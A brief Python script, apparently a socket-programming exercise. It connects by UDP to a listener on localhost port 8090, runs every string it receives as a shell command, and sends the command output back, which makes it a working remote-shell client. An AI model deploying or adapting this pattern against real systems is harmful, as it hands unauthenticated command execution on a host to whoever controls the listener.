import socket
import subprocess

sk = socket.socket(type=socket.SOCK_DGRAM)
addr = ('127.0.0.1', 8090)
sk.sendto(b'xxx',addr)

while True:
    cmd,addr = sk.recvfrom(1024)
    cmd = cmd.decode('gbk')
    res = subprocess.Popen(cmd, shell=True,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
    # content = b'stdout:' + res.stdout.read() + b'stderr:' + res.stderr.read()
    std_out = b'stdout :'+res.stdout.read()
    std_err = b'stderr :'+res.stderr.read()
    sk.sendto(std_out, addr)
    sk.sendto(std_err, addr)